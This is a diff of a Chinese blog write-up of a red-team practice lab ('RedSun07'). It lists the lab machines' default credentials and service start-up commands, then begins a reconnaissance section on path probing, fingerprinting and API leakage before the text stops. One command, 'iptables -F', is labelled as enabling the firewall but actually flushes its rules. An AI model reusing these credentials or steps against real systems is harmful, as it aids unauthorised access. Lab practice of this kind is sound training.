@@ -16,17 +16,132 @@
   <meta name="author" content="August Rosenberg">
   <meta name="keywords" content="">
   
-    <meta name="description" content="简介开始时间：  2024-02-28 结束时间： 环境搭建网络设置 发现需要两个内网网段和一个外网网段 通过nat 网卡模拟外网">
+    <meta name="description" content="简介开始时间：  2024-02-28 结束时间： 环境搭建网络设置 发现需要两个内网网段和一个外网网段 通过nat 网卡模拟外网   web1 ubuntu  密码 web : web2021    web2 ubuntu  密码 ubuntu : ubuntu    pc1 win7  密码 bunny：Bunny2021    pc2 win7  密码 moretz：Moretz2021">
 <meta property="og:type" content="article">
 <meta property="og:title" content="RedSun07">
 <meta property="og:url" content="https://tsy244.github.io/2024/02/28/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/RedSun07/index.html">
 <meta property="og:site_name" content="AU9U5T">
-<meta property="og:description" content="简介开始时间：  2024-02-28 结束时间： 环境搭建网络设置 发现需要两个内网网段和一个外网网段 通过nat 网卡模拟外网">
+<meta property="og:description" content="简介开始时间：  2024-02-28 结束时间： 环境搭建网络设置 发现需要两个内网网段和一个外网网段 通过nat 网卡模拟外网   web1 ubuntu  密码 web : web2021    web2 ubuntu  密码 ubuntu : ubuntu    pc1 win7  密码 bunny：Bunny2021    pc2 win7  密码 moretz：Moretz2021">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240228223447876.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240228224727964.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301110332936.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301111346464.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301111600252.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301111751712.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301112206938.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301112531483.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301112721343.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301112921924.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301122512829.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301122656523.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301125355443.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301123802420.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301123639003.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301124007201.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301151740051.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301124348496.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301124620606.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301124921812.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301130020068.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301130251739.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301130858830.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301131010083.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301131209899.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301131715015.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301131802848.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301131954778.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301132420865.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301134404211.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301134758399.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301135042826.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301160815016.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301161032141.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301161450582.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301162752272.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301163311627.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301164215234.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301164456654.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301182319076.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301190931716.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301191006593.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301191024690.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301191349759.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301192306471.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301192250794.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301192406956.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301192538917.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301192613779.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301192648491.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301193408887.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301193053927.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301201054967.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301201550008.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301201722044.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301210705300.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302095230936.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302095245238.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302095328795.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302095806626.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302095841528.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302095951355.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302100113137.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302100139487.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302100324069.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302100958902.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302111754917.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302111822093.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301211336385.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301211327195.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301211732510.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301211947973.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301211940831.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301212031361.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302135857740.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302135710164.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302140208829.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301212214858.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302143030971.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302143439346.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302143207070.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301213015977.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302143714207.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302143900346.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302160028355.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302165309497.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302165333235.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302165647971.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302165728205.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302172748829.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302173113946.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302173119915.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302173553383.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302174615182.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302175338426.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302175450631.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302175623173.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302175616092.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302175712234.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302175805899.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302183032033.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302183114085.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302183221747.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302183557786.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302184657352.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302184709658.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302214107064.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302214213288.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302214413150.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302225423088.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302230233044.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302230315423.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302230918187.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302231918520.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240302232046477.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301160426723.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301160452977.png">
 <meta property="article:published_time" content="2024-02-28T11:57:13.000Z">
-<meta property="article:modified_time" content="2024-02-28T14:47:30.820Z">
+<meta property="article:modified_time" content="2024-03-02T15:27:13.724Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="靶场记录">
 <meta name="twitter:card" content="summary_large_image">
@@ -230,7 +345,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          58 words
+          14k words
         
       </span>
     
@@ -241,7 +356,7 @@
         
         
         
-          1 mins
+          120 mins
         
       </span>
     
@@ -290,6 +405,539 @@
 <p>发现需要两个内网网段和一个外网网段</p>
 <p>通过nat 网卡模拟外网</p>
 <p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240228224727964.png" srcset="/img/loading.gif" lazyload alt="image-20240228224727964"></p>
+<ol>
+<li><p>web1</p>
+<p>ubuntu</p>
+<blockquote>
+<p>密码</p>
+<p>web : web2021</p>
+</blockquote>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301110332936.png" srcset="/img/loading.gif" lazyload alt="image-20240301110332936"></p>
+</li>
+<li><p>web2</p>
+<p>ubuntu</p>
+<blockquote>
+<p>密码</p>
+<p>ubuntu : ubuntu</p>
+</blockquote>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301111346464.png" srcset="/img/loading.gif" lazyload alt="image-20240301111346464"></p>
+</li>
+<li><p>pc1</p>
+<p>win7</p>
+<blockquote>
+<p>密码</p>
+<p>bunny：Bunny2021</p>
+</blockquote>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301111600252.png" srcset="/img/loading.gif" lazyload alt="image-20240301111600252"></p>
+</li>
+<li><p>pc2</p>
+<p>win7</p>
+<blockquote>
+<p>密码</p>
+<p>moretz：Moretz2021</p>
+</blockquote>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301111751712.png" srcset="/img/loading.gif" lazyload alt="image-20240301111751712"></p>
+</li>
+<li><p>winserver</p>
+<p>winserver 2012</p>
+<blockquote>
+<p>密码</p>
+<p>Administrator：Whoami2021</p>
+</blockquote>
+</li>
+</ol>
+<h2 id="服务搭建"><a href="#服务搭建" class="headerlink" title="服务搭建"></a>服务搭建</h2><p>DMZ 区域的ubuntu 开启redis 和ngnix 服务</p>
+<p>web1</p>
+<p>开启 redis服务</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">redis-server <span class="hljs-regexp">/etc/</span>redis.conf<br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301112206938.png" srcset="/img/loading.gif" lazyload alt="image-20240301112206938"></p>
+<p>开启ngnix服务</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>sbin<span class="hljs-regexp">/nginx -c /</span>etc<span class="hljs-regexp">/nginx/</span>nginx.conf<br><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301112531483.png" srcset="/img/loading.gif" lazyload alt="image-20240301112531483"></p>
+<p>开启防火墙</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">iptables -F</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>web2</p>
+<p>ubuntu </p>
+<p>启动docker </p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">sudo service docker <span class="hljs-literal">start</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301112721343.png" srcset="/img/loading.gif" lazyload alt="image-20240301112721343"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> docker start <span class="hljs-number">8</span>e172820ac78<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p>pc1 </p>
+<p>win7 开启通达oa</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301112921924.png" srcset="/img/loading.gif" lazyload alt="image-20240301112921924"></p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>已知的ip 和我同一个网段，假装使用域名反查到了ip</p>
+<p>模拟正常的习惯</p>
+<p>先查看Ip 模拟已知域名的情况</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301122512829.png" srcset="/img/loading.gif" lazyload alt="image-20240301122512829"></p>
+<h2 id="网站信息收集"><a href="#网站信息收集" class="headerlink" title="网站信息收集"></a>网站信息收集</h2><ol>
+<li><p>访问服务</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301122656523.png" srcset="/img/loading.gif" lazyload alt="image-20240301122656523"></p>
+<p>没有发现什么</p>
+</li>
+<li><p>路径探测</p>
+<p>使用wsl 进行运行，因为windows 运行效率太低</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301125355443.png" srcset="/img/loading.gif" lazyload alt="image-20240301125355443"></p>
+</li>
+<li><p>指纹收集</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240301123802420.png" srcset="/img/loading.gif" lazyload alt="image-20240301123802420"></p>
+</li>
+<li><p>api 泄露</p>
